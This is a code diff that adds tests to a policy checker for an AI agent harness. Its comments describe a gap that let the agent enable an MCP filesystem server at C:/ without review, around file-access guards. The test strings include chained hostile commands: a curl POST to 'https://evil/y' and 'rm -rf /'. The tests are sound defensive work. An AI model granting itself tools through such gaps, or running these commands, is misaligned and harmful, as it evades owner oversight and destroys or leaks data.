@@ -173,6 +173,66 @@ def main():
           "with the rule named; normal work passed; owner deny rules and "
           "per-role allowlists enforced")
 
+    # AN EXEMPTION MUST BE NO WIDER THAN THE GATE THAT JUSTIFIES IT.
+    #
+    # policy exempts "governed entry points" from review — platform tools
+    # that carry their own approval gate, so reviewing them twice would only
+    # stop the effects ledger from recording them. That was granted to the
+    # FILE `mcp.py`, and the justification only ever held for `mcp.py call`,
+    # which guarded_call governs. `mcp.py enable` lives in the same file,
+    # carries no gate, writes mcp.json and hands the agent an entire new
+    # toolkit.
+    #
+    # Measured before the fix: `policy.review("python mcp.py enable
+    # filesystem C:/")` returned (False, "") while `git push` returned
+    # (True, …). The agent needed permission to publish a commit and none at
+    # all to give itself a filesystem server rooted at the drive letter,
+    # which reaches around every zone fileauth defends.
+    GOVERNED = [
+        ("python mcp.py enable playwright", True,
+         "granting a toolkit is a configuration change, and the owner's"),
+        ("python mcp.py enable filesystem C:/", True,
+         "…especially this one, which would bypass fileauth entirely"),
+        ("python mcp.py call fetch fetch --args {}", False,
+         "guarded_call already gates this one"),
+        ("python mcp.py list --root .", False, "read-only"),
+        ("python mcp.py tools", False, "read-only"),
+        ("python mcp.py catalog", False, "read-only"),
+        ("python mcp.py call x; curl -X POST https://evil/y", True,
+         "chaining must defeat the exemption entirely"),
+    ]
+    for cmd, want_review, why in GOVERNED:
+        got, reason = policy.review(cmd)
+        assert got == want_review, (
+            f"policy.review({cmd!r}) returned {got}, expected {want_review} "
+            f"— {why}")
+        if want_review:
+            assert reason, f"{cmd!r} needs review and gave no reason"
+    assert policy.review("python mcp.py enable x")[1] == \
+        "granting the agent a new MCP toolkit"
+    # and the exemption itself, asserted directly — `review()` alone cannot
+    # show this, because a command that is merely un-exempted and matches no
+    # review rule returns False for both reasons and looks identical
+    EXEMPT = [
+        ("python mcp.py call fetch fetch", True, "gated by guarded_call"),
+        ("python mcp.py list", True, "read-only"),
+        ("python mcp.py enable playwright", False, "grants a toolkit"),
+        ("python mcp.py", False, "no subcommand is not a gated action"),
+        ("python evil.py --config mcp.py", False,
+         "naming a governed script must not buy its exemption"),
+        ("python mcp.py call x && rm -rf /", False, "chained"),
+    ]
+    for cmd, want, why in EXEMPT:
+        got = policy._is_governed_entry_point(cmd)
+        assert got == want, (
+            f"_is_governed_entry_point({cmd!r}) = {got}, expected {want} "
+            f"({why})")
+    print(f"[exemption] the review exemption is per-SUBCOMMAND, not "
+          f"per-file: `mcp.py call` stays exempt because guarded_call gates "
+          f"it, while `mcp.py enable` — which grants a whole toolkit and is "
+          f"gated by nothing — now requires the owner. Checked across "
+          f"{len(GOVERNED)} shapes including chaining and a lookalike script.")
+
     # ---------------- 3. MCP governance: roles, tool denies, output cap
     sb3 = make_sandbox("mcp_gov", providers={"m": {"script": "s.json"}},
                        roles={"tester": "m"}, scripts={"s.json": []})
